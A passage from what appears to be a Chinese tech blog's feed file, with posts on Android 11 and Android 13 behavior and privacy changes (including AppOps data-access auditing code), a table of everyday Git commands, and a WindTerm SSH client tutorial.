&#125;</span><br><span class="line"></span><br><span class="line">        override fun onAsyncNoted(asyncNotedAppOp: AsyncNotedAppOp) &#123;</span><br><span class="line">            asyncNotedAppOp.attributionTag?.let &#123;</span><br><span class="line">                logPrivateDataAccess(asyncNotedAppOp.op,</span><br><span class="line">                        it,</span><br><span class="line">                        asyncNotedAppOp.message)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //开启私密数据监听</span><br><span class="line">    val appOpsManager =</span><br><span class="line">            getSystemService(AppOpsManager::class.java) as AppOpsManager</span><br><span class="line">    appOpsManager.setOnOpNotedCallback(mainExecutor, appOpsCallback)</span><br><span class="line"></span><br><span class="line">    btn1.setOnClickListener &#123;</span><br><span class="line">        getLocation()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fun getLocation() &#123;</span><br><span class="line">    val locationManager = attributionContext.getSystemService(</span><br><span class="line">            LocationManager::class.java) as LocationManager</span><br><span class="line">    if (!checkPermission()) &#123;</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line">    val location: Location? = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)</span><br><span class="line">    if (location != null) &#123;</span><br><span class="line">        showToast(&quot;$&#123;location.latitude&#125;&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该例子主要展示了一个<strong>获取位置信息</strong>的功能，如果调用到<strong>getLocation</strong>方法，就会触发<strong>onNoted</strong>回调，回调信息包括危险权限code以及归因。<br>其中<strong>OnOpNotedCallback</strong> 一共三个回调方法：</p><ul><li><strong>onNoted</strong> 正常情况下都会回调到该方法</li><li><strong>onAsyncNoted</strong> 如果数据访问并非发生在应用调用API期间，就会调用onAsyncNoted()，比如一些监听器的回调。</li><li><strong>onSelfNoted</strong> 在极少数情况下，如果应用将自身的UID传递到 noteOp()，需要调用 onSelfNoted()。</li></ul><p>最后点击按钮，看下回调的结果日志：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Private data accessed. Operation: android:coarse_location</span><br><span class="line">     Attribution Tag:shareLocation</span><br><span class="line">    Stack Trace:</span><br><span class="line">    [Ljava.lang.StackTraceElement;@14f5a16</span><br></pre></td></tr></table></figure><p>可以看到权限代码：<strong>android:coarse_location</strong> 以及归因 <strong>shareLocation</strong></p><h3 id="单次授权"><a href="#单次授权" class="headerlink" title="单次授权"></a>单次授权</h3><blockquote><p>在 Android 11 中，每当应用请求与位置信息、麦克风或摄像头相关的权限时，面向用户的权限对话框会包含仅限这一次选项。如果用户在对话框中选择此选项，系统会向应用授予临时的单次授权。</p></blockquote><p>简单的说，就是在申请与<strong>位置信息、麦克风或摄像头</strong>相关的权限时，系统会自动提供一个<strong>单次授权</strong>的选项，只供这一次权限获取。然后用户下次打开app的时候，系统会再次提示用户授予权限。这个影响应该不大，只要我们每次使用的时候都去判断权限，没有就去申请即可。放一张新版本权限获取样式：</p><p><img src="/images/20220903/20220903006.jpg"></p><h3 id="权限对话框的可见性"><a href="#权限对话框的可见性" class="headerlink" title="权限对话框的可见性"></a>权限对话框的可见性</h3><blockquote><p>Android 11 建议不要请求用户已选择拒绝的权限。在应用安装到设备上后，如果用户在使用过程中屡次针对某项特定的权限点按拒绝，此操作表示其希望“不再询问”。</p></blockquote><p>这个都算不上改动，只是官方的一个良好建议。建议在用户多次拒绝之后，不要再展示权限申请。</p><h3 id="Scudo-Hardened-Allocator"><a href="#Scudo-Hardened-Allocator" class="headerlink" title="Scudo Hardened Allocator"></a>Scudo Hardened Allocator</h3><blockquote><p>Android 11 在内部使用 Scudo Hardened Allocator 为堆分配提供服务。Scudo 能够检测并减轻某些类型的内存安全违规行为。如果您在原生代码崩溃报告中发现与 Scudo 相关的崩溃（例如 Scudo ERROR:），请参阅 Scudo 问题排查文档。</p></blockquote><p><strong>Scudo</strong>是一种动态的用户模式内存分配器，旨在抵御与堆相关的漏洞，同时保持良好的性能。它是一个开源的项目。<br>Android 11中，将采用这个新的<strong>heap分配器</strong>，性能更好，更安全。</p><h3 id="文件描述符排错程序"><a href="#文件描述符排错程序" class="headerlink" title="文件描述符排错程序"></a>文件描述符排错程序</h3><blockquote><p>Android 10 引入了 fdsan（文件描述符排错程序）。fdsan 检测错误处理文件描述符所有权的错误，例如 use-after-close 和 double-close。在 Android 11 中，fdsan 的默认模式发生了变化。现在，fdsan 会在检测到错误时中止，而以前的行为则是记录警告并继续。</p></blockquote><p>问题来了，<strong>fdsan</strong>是啥？先要了解fd是啥</p><p>文件描述符(FileDescriptor) 是<strong>Unix／Linux</strong>系统文件操作的相关概念，它在形式上是一个非负整数。当程序打开一个现有文件或者创建一个新文件时，内核向进程返回一个文件描述符。系统的进程也就是使用了这个fd来标示打开的文件，有了它就能对文件做各种操作，获得文件的各种相关信息了。</p><p>所以<strong>fdsan</strong>也就是检测文件处理中发生的一些错误。</p><h3 id="应用使用情况统计信息"><a href="#应用使用情况统计信息" class="headerlink" title="应用使用情况统计信息"></a>应用使用情况统计信息</h3><blockquote><p>为了更好地保护用户，Android 11 将每个用户的应用使用情况统计信息存储在凭据加密存储空间中。</p></blockquote><p>这就涉及到了<strong>UsageStatsManager</strong>，UsageStatsManager是Android提供统计应用使用情况的服务。通过这个服务可以获取指定时间区间内应用使用统计数据、组件状态变化事件统计数据以及硬件配置信息统计数据。</p><p>比如<strong>queryAndAggregateUsageStats</strong>方法，可以获取指定时间区间内使用统计数据，以应用包名为键值进行数据合并。</p><p>但是在Android 11 设备中，不好意思，不能随意使用这些信息了。只有当**isUserUnlocked()**方法返回true的时候，才能正常访问这些数据。也就是以下两种情况：</p><ul><li>用户在系统启动后首次解锁其设备</li><li>用户在设备上切换到自己的帐号</li></ul><h3 id="JobScheduler-API-调用限制调试"><a href="#JobScheduler-API-调用限制调试" class="headerlink" title="JobScheduler API 调用限制调试"></a>JobScheduler API 调用限制调试</h3><p><strong>JobScheduler</strong>任务调度器，可以在设备空闲时做一些任务处理。Android11中如果你设置为<strong>debug模式</strong>（debuggable 清单属性设置为 true），超出速率限制的<strong>JobScheduler API</strong>调用将返回 <strong>RESULT_FAILURE</strong>。这个有什么用呢？应该可以帮助我们发现一些性能问题，感兴趣的可以自己试试。</p><p>顺便提下，Jetpack组件<strong>WorkManager</strong>也是用到了JobScheduler，不熟悉的同学可以去了解下，JobScheduler是由SystemServer进程启动的一个系统服务，所以才可以有这么大的权限。</p><h3 id="无障碍操作"><a href="#无障碍操作" class="headerlink" title="无障碍操作"></a>无障碍操作</h3><blockquote><p>在以前的 Android 版本中，框架会向未正确处理基于点击的无障碍操作的微件分派触摸事件。通常，这些视图会直接处理触摸事件，而不是注册点击监听器。为了在正确定义无障碍操作的应用中创建更一致的行为，Android 11 绝不会分派触摸事件。相反，系统会完全依赖于基于点击的无障碍操作：ACTION_CLICK 和 ACTION_LONG_CLICK。此更改会影响屏幕阅读器的行为。</p></blockquote><p>在Android手机上有个预安装的屏幕阅读服务，叫做<strong>TalkBack</strong>，为视力障碍人士或者视力状态不佳的老年人提供。那我们应用为了让这个阅读器能够读懂你的自定义view操作，必须给与自定义控件定义处理程序，包括<strong>点击</strong>，<strong>长按</strong>等操作。原来版本可能对于<strong>OnTouchListener</strong>也支持无障碍触摸事件，而在Android11中，必须专门制定点击或者长按事件才行了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">class TriSwitch(context: Context) : Switch(context) &#123;</span><br><span class="line">    // 0, 1, or 2.</span><br><span class="line">    var currentState: Int = 0</span><br><span class="line">        private set</span><br><span class="line"></span><br><span class="line">    init &#123;</span><br><span class="line">        updateAccessibilityActions()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private fun updateAccessibilityActions() &#123;</span><br><span class="line">        ViewCompat.replaceAccessibilityAction(this, ACTION_CLICK,</span><br><span class="line">            action-label) &#123;</span><br><span class="line">            view, args -&gt; moveToNextState()</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private fun moveToNextState() &#123;</span><br><span class="line">        currentState = (currentState + 1) % 3</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一个自定义控件<strong>TriSwitch</strong>，继承自Switch，由于和Switch的点击效果不一样，所以必须通过替换 <strong>ViewCompat.replaceAccessibilityAction()</strong> 来重新定义相应的无障碍操作。</p><h3 id="非SDK接口限制"><a href="#非SDK接口限制" class="headerlink" title="非SDK接口限制"></a>非SDK接口限制</h3><blockquote><p>Android 11 包含更新后的受限制非 SDK 接口列表（基于与 Android 开发者之间的协作以及最新的内部测试）。在限制使用非 SDK 接口之前，我们会尽可能确保提供公开替代方案。</p></blockquote><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>一路分析下来也可以看到，如果是重要的改动，特别是涉及到崩溃的改动还是放到了<strong>targetSdkVersion=30</strong>的内容中，这也是每次Android发版的一个潜规则吧，为了最大程度不影响已上线的app所作出的举动。</p><h3 id="附件"><a href="#附件" class="headerlink" title="附件"></a>附件</h3><p><a href="https://developer.android.google.cn/preview/behavior-changes-all">官网改动介绍</a></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git常用命令实例</title>
      <link href="/2022/09/01/2022-09-01/"/>
      <url>/2022/09/01/2022-09-01/</url>
      
        <content type="html"><![CDATA[<table><thead><tr><th align="left">命令</th><th align="left">作用</th><th align="left">示例</th></tr></thead><tbody><tr><td align="left">git branch</td><td align="left">查看本地所有分支</td><td align="left"></td></tr><tr><td align="left">git  branch -a</td><td align="left">查看本地、远程所有分支</td><td align="left"></td></tr><tr><td align="left">git checkout -b feature-initialization origin/feature-initialization</td><td align="left">拉取远程分支feature-initialization，在本地起名为feature-initialization，并切换到本地 feature-initialization分支</td><td align="left"></td></tr><tr><td align="left">git pull origin feature-initialization</td><td align="left">拉取指定分支代码</td><td align="left">拉取代码，从feature-initialization分支上面</td></tr><tr><td align="left">git add .</td><td align="left">将文件和文件夹增加到git 缓存</td><td align="left"></td></tr><tr><td align="left">git commit -m “提交相关备注信息”</td><td align="left">提交代码到本地仓库</td><td align="left"></td></tr><tr><td align="left">git  remote   -v</td><td align="left">查看远程git仓库的地址</td><td align="left"></td></tr><tr><td align="left">git  log</td><td align="left">查看提交日志</td><td align="left"></td></tr><tr><td align="left">git   log   -p    -2</td><td align="left">查看提交日志，-p 选项展开显示每次提交的内容差异，-2 则仅显示最近的两次更新</td><td align="left"></td></tr><tr><td align="left">git  reset</td><td align="left">还原，一般用在舍弃本地修改的内容，让本地代码和远程某一次提交的版本相同</td><td align="left"></td></tr><tr><td align="left">git   rm     –cached  <file></td><td align="left">不删除物理文件，仅仅从 git 仓库中删除</td><td align="left">增加了一个配置文件，已经push 了， 现在想去除git版本管理，但是要保留此文件，此时可以使用此命令</td></tr><tr><td align="left">git   checkout    <file></td><td align="left">检出指定文件</td><td align="left"></td></tr><tr><td align="left">git  status</td><td align="left">查看本地改动</td><td align="left"></td></tr><tr><td align="left">git  checkout      release</td><td align="left">切换分支</td><td align="left">切换到本地另外一个分支</td></tr><tr><td align="left">git  checkout    -b  release</td><td align="left">创建一个分支并切换过去</td><td align="left"></td></tr><tr><td align="left">git   checkout    –   pom.xml</td><td align="left">撤销工作区对pom文件的修改,前提是未执行git   add  .</td><td align="left"></td></tr><tr><td align="left">git  reset   HEAD   <file></td><td align="left">撤销add 到暂缓区的修改，重新放回到工作区,若需要撤销工作区的修改，使用git  checkout  –   <file></td><td align="left"></td></tr><tr><td align="left">git log   <file></td><td align="left">查看某一个文件的提交记录</td><td align="left"></td></tr><tr><td align="left">git remote prune origin</td><td align="left">清理本地分支（远程删除了某分支， 可是本地 git branch -a  任然可以看到，可以使用此命令清理）</td><td align="left"></td></tr><tr><td align="left">git   checkout -b  newBranchName</td><td align="left">在本地创建一个新的分支，并切换到新创建的分支</td><td align="left"></td></tr><tr><td align="left">git push –set-upstream origin   localname</td><td align="left">将本地分支和远程分支关联起来（两步：1：在远端创建一个分支；2：将本地分支和远端分支关联起来）</td><td align="left"></td></tr><tr><td align="left">git  tag</td><td align="left">查看所有的tag</td><td align="left"></td></tr><tr><td align="left">git  tag  -a  v1.0.1</td><td align="left">创建一个tag</td><td align="left">-a 选项意为”创建一个带注解的标签”。 不用 -a 选项也可以执行的，但它不会记录这标签是啥时候打的，谁打的，也不会让你添加个标签的注解。</td></tr><tr><td align="left">git  tag   -d   v1.0.1</td><td align="left">删除tag</td><td align="left"></td></tr><tr><td align="left">git reflog –date=local | grep hotfix-20220901-v1.0.0</td><td align="left">查看某一个分支是基于哪个分支创建的</td><td align="left"></td></tr><tr><td align="left">git reflog show –date=iso  feature-20220901-v1.1.0</td><td align="left">查看某一个分支是基于哪个分支创建的</td><td align="left"></td></tr><tr><td align="left">git push origin –delete  branchName</td><td align="left">删除远程分支</td><td align="left"></td></tr><tr><td align="left">git branch -d  branchName</td><td align="left">删除本地分支 [ 需要切换到master分支，才可以删除其他的分支 ]</td><td align="left"></td></tr><tr><td align="left">git merge dev</td><td align="left">合并指定分支到当前分支（例子：当前在master分支，合并dev分知到master）</td><td align="left"></td></tr><tr><td align="left">git branch   -vv</td><td align="left">查看本地分支和远程分支的关联关系</td><td align="left"></td></tr><tr><td align="left">git cherry-pick 82ecb31</td><td align="left">合并某一次提交到指定分支</td><td align="left">git checkout master<br>git cherry-pick 82ecb31<br>如上，先切换到master分支，然后合并82ecb31这次提交到master。</td></tr><tr><td align="left">git push dev:dev</td><td align="left">推送本地指定分支到远程指定分支</td><td align="left"></td></tr><tr><td align="left">git branch –set-upstream-to=origin/feature-20210511-core-include</td><td align="left">将本地分支与远程同名分支建立关联关系</td><td align="left"></td></tr><tr><td align="left">git clone -b  featureName  repoAddress</td><td align="left">克隆指定分支</td><td align="left">git clone -b feature-20211019-openapitoken <a href="https://github.com/longzhiye/LibLongzhiye">https://github.com/longzhiye/LibLongzhiye</a></td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WindTerm使用教程</title>
      <link href="/2022/08/18/2022-08-18/"/>
      <url>/2022/08/18/2022-08-18/</url>
      
        <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>WindTerm 是一款开源免费、跨平台SSH/Sftp/Shell/Telnet/Serial 客户端，即远程连接工具，还跨平台，支持 Windows、Linux 和 macOS。</p><p>直接到 release 页面选择适合自己操作系统的安装包。</p><p><a href="https://github.com/kingToolbox/WindTerm">WindTerm链接地址</a></p><h2 id="特征"><a href="#特征" class="headerlink" title="特征"></a>特征</h2><ol><li>实现了 SSH v2、Telnet、Raw Tcp、Serial、Shell 协议。</li><li>会话认证时支持 SSH 自动执行。</li><li>支持SSH代理转发。</li><li>支持使用密码、公钥、键盘交互、gssapi-with-mic 的 SSH</li><li>自动登录。</li><li>支持X11转发。</li><li>支持直接/本地端口转发、反向/远程端口转发和动态端口转发。</li><li>集成sftp、scp客户端，支持下载、上传、删除、重命名、新建文件/目录等。</li><li>集成本地文件管理器，支持移动到、复制到、复制自、删除、重命名、新建文件/目录等。</li><li>支持 Cmd、PowerShell 和 Cmd、PowerShell 作为管理员。</li></ol><p>官网主页还有大量竞品的对比数据，体积 30M 左右，相对于动辄 200M 左右的安装包，真的是良心。</p><p><img src="/images/20220818/20220818101348.png"></p><p>安装完成后，打开的界面和传统的终端不太一样，WindTerm 更像 IDE 的布局，左边是资源管理器+文件管理器，中间会默认打开一个 zsh 的终端窗口，右边是会话窗口+历史命令窗口，底部是发送窗口 + Shell 窗口。</p><p><img src="/images/20220818/20220818101152.png"></p><h2 id="使用-WindTerm"><a href="#使用-WindTerm" class="headerlink" title="使用 WindTerm"></a>使用 WindTerm</h2><h4 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h4><p>使用终端最重要的一个场景就是 SSH，连接远程服务器，我这里有一个 1G 内存的轻量级云服务器，我们来连接它体验一下。</p><p>点击新建会话按钮开始 SSH 连接。</p><p><img src="/images/20220818/20220818101630.png"></p><p>添加主机名，点击「连接」开始进行远程链接。</p><p><img src="/images/20220818/20220818101702.png"></p><p>紧接着输入用户名和密码，我们关掉一些没必要的窗口，让整个界面更加清爽一些。</p><p><img src="/images/20220818/20220818101802.png"></p><p>如果感觉字体比较小的话，可以直接按住「ctrl +」两个组合键放大字体。</p><p>WindTerm 给我一个非常直观的操作是，它提供了一个折叠的功能，点击-号折叠，点击+号展开。</p><p><img src="/images/20220818/20220818101834.png"></p><p>还有一个就是智能提示，非常到位，响应速度很快。</p><p><img src="/images/20220818/20220818102029.png"></p><h3 id="温馨提示"><a href="#温馨提示" class="headerlink" title="温馨提示"></a>温馨提示</h3><p>WindTerm有自动锁屏的功能，过段时间（默认 30 分钟）没有操作，就会自动锁屏。建议进入会话-首选项-设置，修改锁屏超时为0</p><p><img src="/images/20220818/20220818111258.png"></p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>WindTerm 的体验不错，自动补全功能还是非常强大的，只需要在行首键入 ! 就可以调出历史命令，安装体积小，内存占用低</p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WindTerm </tag>
            
            <tag> SSH </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android 13新特性：自动清除剪贴板历史记录</title>
      <link href="/2022/08/17/2022-08-17/"/>
      <url>/2022/08/17/2022-08-17/</url>
      
        <content type="html"><![CDATA[<p>今年5月，谷歌I/O开发者大会正式召开。在这次活动中，Android 13正式亮相与大家见面，并带来了全新功能升级。</p><p>近日，谷歌向旗下的 Pixel 手机推送了 Android 13 正式版更新。随着正式版本的到来，更多新的功能升级特性也陆续被用户发现。</p><p><img src="/images/20220817/202208181650001.png"></p><p>与之对比，谷歌于2020 年 9 月推送了 Android 11，于去年 10 月带来Android 12。可以看到，今年的 Android 13 正式版到来要比以往几代早上了不少。</p><p>至于新功能特性方面，在今年的Android 13发布活动中，谷歌就为其带来了不少隐私方面的升级介绍。而现在的最新消息也显示，其还带来了更多新支持。</p><p><img src="/images/20220817/202208181650002.png"></p><p>相关的消息提到，安装 Android 13 后的一个比较明显的变化就是，设备的剪贴板在一段时间后会变为空白。</p><p>也就是说，在全新的 Android 13 中，系统剪贴板将在“特定时间”后自行清除。</p><p><img src="/images/20220817/202208181650003.png"></p><p>而来自谷歌的官方解释则显示，为防止对剪贴板的不必要的访问，如果用户在设备上复制电子邮件地址、电话号码或登录凭据等敏感数据，Android 会在一段时间后自动清除剪贴板历史记录。</p><p><img src="/images/20220817/202208181650004.png"></p><p>至于其中提到的“一段时间”具体是多久，谷歌官方并没有给出确切的时间范围。但相关的爆料显示，Android 13 的剪贴板需要一个小时才能自动清除。</p><p>结合相关的爆料和官方回应来看，这一设计似乎是为了更好的保障用户隐私。</p><p><img src="/images/20220817/202208181650005.png"></p><p>除了剪切板自动清除，Android 13也还在隐私保护方面带来了其他的升级。</p><p>据悉，其新增了“隐私信息中心”功能。基于这项功能，用户可以直接检查最多过去一周各项权限的使用情况，包括系统应用在内的权限使用都可以在这里看到详细到分钟的权限使用记录。</p><p><img src="/images/20220817/202208181650006.png"></p><p>同时，在Android 13 中，用户不必再与应用共享整个媒体库，可以单独选择允许应用访问的特定照片和视频。</p><p>Android 13 还有助于控制用户的通知，并确保用户只收到自己需要的通知。下载的应用程序需要明确许可才能发送通知，而不是默认允许发送通知。</p>]]></content>
      
      
      <categories>
          
          <category> 资讯 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android13 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android 13现已正式发布至 AOSP！</title>
      <link href="/2022/08/16/2022-08-16/"/>
      <url>/2022/08/16/2022-08-16/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/20220816/202208181330000.jpg"></p><p>Android 13 的源代码推送至 Android 开源项目 (AOSP)，并正式发布最新版本的 Android。对于开发者来说，Android 13 聚焦于我们的核心主题，即隐私和安全，以及开发者生产力，帮助您更轻松地为用户构建优良的体验。</p><blockquote><p>Android 开源项目<br><a href="https://source.android.google.cn/">https://source.android.google.cn</a></p></blockquote><blockquote><p>适用于大屏设备开发的响应式布局<br><a href="https://developer.android.google.cn/large-screens">https://developer.android.google.cn/large-screens</a></p></blockquote><p>Android 13 自即日起会推送至 Pixel 设备。今年晚些时候，Android 13 也会推送至其他的设备，包括三星 Galaxy、华硕、HMD (诺基亚手机)、iQOO、摩托罗拉、一加、OPPO、真我、夏普、索尼、TECNO、vivo、小米等。</p><h2 id="Android-13-为开发者带来了什么？"><a href="#Android-13-为开发者带来了什么？" class="headerlink" title="Android 13 为开发者带来了什么？"></a>Android 13 为开发者带来了什么？</h2><p>Android 13 带来的更新内容众多，下文只是精选的一部分。请您务必前往 Android 13 开发者网站了解所有新功能的详细信息:<br><a href="https://developer.android.google.cn/13">https://developer.android.google.cn/13</a></p><h3 id="开发者生产力和工具"><a href="#开发者生产力和工具" class="headerlink" title="开发者生产力和工具"></a>开发者生产力和工具</h3><p><strong>主题应用图标</strong> - Android 13 将 Material You 的动态颜色扩展到了所有应用图标，让用户可以基于其壁纸和其他主题偏好来选择图标色调。您的应用仅需提供一个单色的应用图标，并对自适应图标 XML 进行一些调整即可。请访问官方文档了解详细信息:<br><a href="https://developer.android.google.cn/about/versions/13/features#themed-app-icons">https://developer.android.google.cn/about/versions/13/features#themed-app-icons</a></p><p><img src="/images/20220816/202208181400000.png" alt="基于壁纸颜色和深色主题 (左) 改变色调的主题应用图标"></p><center>基于壁纸颜色和深色主题 (左) 改变色调的主题应用图标</center><blockquote><p>图标规格<br>    <a href="https://developer.android.google.cn/guide/practices/ui_guidelines/icon_design_adaptive#design-adaptive-icons">https://developer.android.google.cn/guide/practices/ui_guidelines/icon_design_adaptive#design-adaptive-icons</a></p></blockquote><p><strong>按应用设定语言偏好</strong> - Android 13 可以让应用使用不同于系统语言的其他语言，以更好地满足多语言用户的需求。Android 现在为应用提供了一个标准的 “应用语言” 设置面板 (如果应用选择支持此功能)，您还可以调用一个新的平台 API，在运行时获取或设置用户的首选语言区域，从而减少模板代码并提高兼容性。请访问官方文档了解详细信息:<br><a href="https://developer.android.google.cn/guide/topics/resources/app-languages">https://developer.android.google.cn/guide/topics/resources/app-languages</a></p><p><img src="/images/20220816/202208181410000.png" alt="设置中的单个应用语言选项"></p><center>设置中的单个应用语言选项</center><blockquote><p>使用 android:localeConfig 将受支持的语言添加到手机设置中<br><a href="https://developer.android.google.cn/guide/topics/resources/app-languages#use-localeconfig">https://developer.android.google.cn/guide/topics/resources/app-languages#use-localeconfig</a></p></blockquote><blockquote><p>LocaleManager<br><a href="https://developer.android.google.cn/reference/android/app/LocaleManager">https://developer.android.google.cn/reference/android/app/LocaleManager</a></p></blockquote><p><strong>改进的文本支持</strong> - Android 13 针对文本和语言提供了多项改进，帮助您打造更加完美的体验。更快的断字将断字性能优化了多达 200%，因此现在可以在 TextView 中启用此功能，这几乎不影响渲染性能。通过使用文本转换 API，能让中文、日文等需要使用拼音输入的语言在执行搜索和自动完成等功能时的速度更快。Android 13 还改善了非拉丁文字 (如泰米尔语、缅甸语、泰卢固语和藏语等) 的行高，让字符免于被裁切且更加易于阅读。请访问官方文档了解详细信息:<br><a href="https://developer.android.google.cn/about/versions/13/features#language-support">https://developer.android.google.cn/about/versions/13/features#language-support</a></p><p><img src="/images/20220816/202208181413.png" alt="以 Android 13 为目标平台的应用中的非拉丁文字行高改进效果 (下)"></p><center>以 Android 13 为目标平台的应用中的非拉丁文字行高改进效果 (下)</center><blockquote><p>更快的断字<br><a href="https://developer.android.google.cn/about/versions/13/features#faster-hyphenation">https://developer.android.google.cn/about/versions/13/features#faster-hyphenation</a></p></blockquote><blockquote><p>文本转换 API<br><a href="https://developer.android.google.cn/about/versions/13/features#text-conversion">https://developer.android.google.cn/about/versions/13/features#text-conversion</a></p></blockquote><blockquote><p>改进了非拉丁字母的行高<br><a href="https://developer.android.google.cn/about/versions/13/features#line-height">https://developer.android.google.cn/about/versions/13/features#line-height</a></p></blockquote><p><strong>彩色矢量字体</strong> - Android 13 增加了对 COLR 版本 1 (请参考详细规格和介绍视频) 字体的渲染支持，并将系统表情符号更新为 COLRv1 格式。COLRv1 是一种新的、高度紧凑的字体格式，在任何尺寸下都能快速清晰地渲染。对于大多数应用，这项修改完全无法被感知到，系统会自动处理好一切。您可以在 Chrome 发布公告中了解更多关于 COLRv1 的信息:<br><a href="https://developer.chrome.com/blog/colrv1-fonts/">https://developer.chrome.com/blog/colrv1-fonts/</a></p><p><img src="/images/20220816/202208181415000.png" alt="COLRv1 矢量表情符号 (左) 和位图表情符号"></p><center>COLRv1 矢量表情符号 (左) 和位图表情符号</center><blockquote><p>COLR 规格<br>    <a href="https://docs.microsoft.com/en-us/typography/opentype/spec/colr">https://docs.microsoft.com/en-us/typography/opentype/spec/colr</a><br>COLR 介绍视频<br>    <a href="https://www.youtube.com/watch?v=BmqYm5Wwz8M">https://www.youtube.com/watch?v=BmqYm5Wwz8M</a></p></blockquote><p><strong>快捷设置放置 API</strong> - 对于提供自定义快捷设置 (Quick Settings) 图块的应用，Android 13 能让用户更容易发现和添加您的图块。借助新的图块放置 API，您的应用现在可以让用户通过对话框直接添加您的自定义快捷设置图块，而且只需一步即可完成操作，不需要离开您的应用。请访问官方文档了解详细信息:<br><a href="https://developer.android.google.cn/about/versions/13/features#quick-settings">https://developer.android.google.cn/about/versions/13/features#quick-settings</a></p><blockquote><p>TileService<br>    <a href="https://developer.android.google.cn/reference/android/service/quicksettings/TileService">https://developer.android.google.cn/reference/android/service/quicksettings/TileService</a><br>图块放置 API<br>    <a href="https://developer.android.google.cn/reference/android/app/StatusBarManager#requestAddTileService(android.content.ComponentName,%20java.lang.CharSequence,%20android.graphics.drawable.Icon,%20java.util.concurrent.Executor,%20java.util.function.Consumer%3Cjava.lang.Integer%3E)">https://developer.android.google.cn/reference/android/app/StatusBarManager#requestAddTileService(android.content.ComponentName,%20java.lang.CharSequence,%20android.graphics.drawable.Icon,%20java.util.concurrent.Executor,%20java.util.function.Consumer%3Cjava.lang.Integer%3E)</a></p></blockquote><p><strong>可编程着色器 (shader)</strong> - Android 13 引入了可编程 RuntimeShader 对象，其行为使用 Android 图形着色语言 (Android Graphics Shading Language, AGSL) 定义。您可以使用这些着色器在自己的应用中实现波纹、模糊和过度滚动拉伸，以及类似的高级效果。请访问官方文档了解详细信息:<br><a href="https://developer.android.google.cn/guide/topics/graphics/agsl">https://developer.android.google.cn/guide/topics/graphics/agsl</a></p><blockquote><p>RuntimeShader<br>    <a href="https://developer.android.google.cn/reference/android/graphics/RuntimeShader">https://developer.android.google.cn/reference/android/graphics/RuntimeShader</a></p></blockquote><blockquote><p>Android 图形着色语言<br>    <a href="https://developer.android.google.cn/guide/topics/graphics/agsl">https://developer.android.google.cn/guide/topics/graphics/agsl</a></p></blockquote><blockquote><p>波纹 (Ripple)<br>    <a href="https://cs.android.com/android/platform/superproject/+/master:frameworks/base/graphics/java/android/graphics/drawable/RippleShader.java;l=24?q=RippleShader&amp;sq=">https://cs.android.com/android/platform/superproject/+/master:frameworks/base/graphics/java/android/graphics/drawable/RippleShader.java;l=24?q=RippleShader&amp;sq=</a></p></blockquote><blockquote><p>模糊 (Blur)<br>    <a href="https://cs.android.com/android/platform/superproject/+/master:frameworks/native/libs/renderengine/skia/filters/BlurFilter.cpp?q=RuntimeShader&amp;ss=android/platform/superproject&amp;start=21">https://cs.android.com/android/platform/superproject/+/master:frameworks/native/libs/renderengine/skia/filters/BlurFilter.cpp?q=RuntimeShader&amp;ss=android%2Fplatform%2Fsuperproject&amp;start=21</a></p></blockquote><blockquote><p>过度滚动拉伸 (Stretch)<br>    <a href="https://cs.android.com/android/platform/superproject/+/master:frameworks/base/tests/HwAccelerationTest/src/com/android/test/hwui/StretchShaderActivity.java?q=RuntimeShader&amp;ss=android/platform/superproject&amp;start=11">https://cs.android.com/android/platform/superproject/+/master:frameworks/base/tests/HwAccelerationTest/src/com/android/test/hwui/StretchShaderActivity.java?q=RuntimeShader&amp;ss=android%2Fplatform%2Fsuperproject&amp;start=11</a></p></blockquote><p><strong>基于 PlaybackState 的媒体控件</strong> - 对于以 Android 13 为目标平台的应用，系统基于 PlaybackState 操作清单实现了更丰富的媒体控件，从而在手机和平板电脑等设备类型上获得更佳的一致性，并和 Android Auto 和 Android TV 等其他 Android 平台保持一致。请访问官方文档了解详细信息:<br><a href="https://developer.android.google.cn/about/versions/13/behavior-changes-13#playback-controls">https://developer.android.google.cn/about/versions/13/behavior-changes-13#playback-controls</a></p><p><img src="/images/20220816/202208181419000.png" alt="Android 13 媒体控件在手机和平板电脑上保持一致"></p><center>Android 13 